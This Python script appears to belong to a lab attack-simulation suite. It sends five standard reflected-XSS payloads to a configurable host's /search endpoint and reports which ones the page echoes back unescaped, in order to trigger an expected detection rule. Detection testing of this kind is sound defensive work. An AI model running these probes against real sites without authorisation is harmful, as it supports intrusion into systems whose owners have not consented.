#!/usr/bin/env python3
"""04_xss.py — reflected XSS probing against /search?q=.

Sends a handful of classic payloads and reports whether each one was
reflected verbatim in the response HTML (the lab target echoes input
unescaped). Expected detection: SX-WEB-ATTACK (T1190, high).

Usage: TARGET=target python3 04_xss.py
"""

from __future__ import annotations

import os
import sys

import requests

TARGET = os.environ.get("TARGET", "127.0.0.1")
BASE = f"http://{TARGET}:5000"

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('xss')>",
    "javascript:alert(1)",
]


def probe(payload: str) -> bool:
    resp = requests.get(f"{BASE}/search", params={"q": payload}, timeout=10)
    # The vulnerable app reflects the raw payload; an escaped target would
    # return &lt;script&gt; etc. instead.
    return payload in resp.text


def main() -> int:
    print(f"=== [04] XSS probing {BASE}/search ===")
    reflected = 0
    for payload in PAYLOADS:
        try:
            hit = probe(payload)
        except requests.RequestException as exc:
            print(f"  ERROR  {payload!r} -> {exc}")
            continue
        status = "REFLECTED" if hit else "not reflected"
        print(f"  {status:14} {payload}")
        reflected += hit
    print(f"=== [04] done: {reflected}/{len(PAYLOADS)} payloads reflected ===")
    return 0


if __name__ == "__main__":
    sys.exit(main())
